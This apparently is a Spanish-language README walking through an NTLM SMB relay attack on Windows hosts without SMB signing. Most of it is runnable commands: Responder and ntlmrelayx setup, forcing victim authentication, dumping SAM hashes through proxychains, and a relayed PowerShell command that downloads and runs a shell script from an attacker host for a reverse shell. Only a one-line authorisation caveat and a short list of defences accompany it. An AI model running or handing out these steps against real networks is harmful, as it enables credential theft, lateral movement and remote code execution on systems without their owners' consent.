# NTLM SMB Relay Attack Guide

## 📌 Descripción
Guía técnica para realizar ataques de **NTLM Relay** contra sistemas Windows con SMB signing deshabilitado, permitiendo ejecución remota de comandos, robo de hashes y movimiento lateral.

![imagen](https://github.com/90l3m0np13/NTLM-SMB-RELAY/blob/main/Imagen.jpeg)

## ⚠️ Requisitos Legales
- **Solo para pentesting autorizado o entornos de laboratorio**.  
- Nunca atacar sistemas sin permiso explícito.

---

## 🔧 Herramientas Necesarias
- **Kali Linux** (o distribución con herramientas preinstaladas).  
- **Impacket**: `sudo apt install impacket`.  
- **CrackMapExec**: `sudo apt install crackmapexec`.  
- **Responder**: `sudo apt install responder`.  

---

## 🚀 Pasos del Ataque

### 1️⃣ Identificar sistemas vulnerables
```bash
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
````
   
Salida esperada:
SMB   192.168.1.10    SIGNING:Not enforced  # ¡Vulnerable!

2️⃣ Configurar targets.txt
plaintext
Copy

smb://192.168.1.10
smb://192.168.1.20

3️⃣ Desactivar SMB/HTTP en Responder
 ```bash
/etc/responder/Responder.conf:
````
SMB = Off
HTTP = Off

4️⃣ Iniciar NTLM Relay
````bash
impacket-ntlmrelayx -smb2support -tf targets.txt -socks -debug
````
5️⃣ Iniciar Responder (en otra terminal)
```bash
sudo responder -I eth0
````

6️⃣ Explotación con ProxyChains

Editar socks4 127.0.0.1 1080
```bash
/etc/proxychains4.conf:
````
7 Poner la máquina en escucha con netcat
```bash
netcat -lvp 5555
````

## 💣 Paso clave: Forzar autenticación

## Ejecutar esto en CMD de la víctima:
```bash
net use \\192.168.1.100\fake-share /u:fakeuser fakepass
````
## O intentar acceder manualmente a:
```bash
\\192.168.1.100\carpeta-falsa
````
## 🎯 Explotación exitosa
## Cuando veas esto en ntlmrelayx:
[+] Authenticated against 192.168.1.10 (Windows 10)

## Opción A: Robar hashes
````bash
proxychains4 crackmapexec smb 192.168.1.10 -u '' -p '' --sam
````
## Opción B: Reverse Shell
## 1. Hostear shell.ps1 (Terminal 3)
```bash
python3 -m http.server 8000
````
## 2. Ejecutar relay con payload
```bash
impacket-ntlmrelayx -smb2support -tf targets.txt -c "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://TU_IP:8000/shell.ps1')\""
````

## 🔒 Medidas de protección
- Activar SMB Signing (GPO)
- Deshabilitar NTLM
- Bloquear tráfico SMB no esencial
- Monitorear eventos 4624 (Windows) con autenticaciones inusuales

⚠️ IMPORTANTE: Este ataque solo funciona si:
- La víctima tiene privilegios de administrador
- El servicio SMB está activo
- No hay SMB signing habilitado


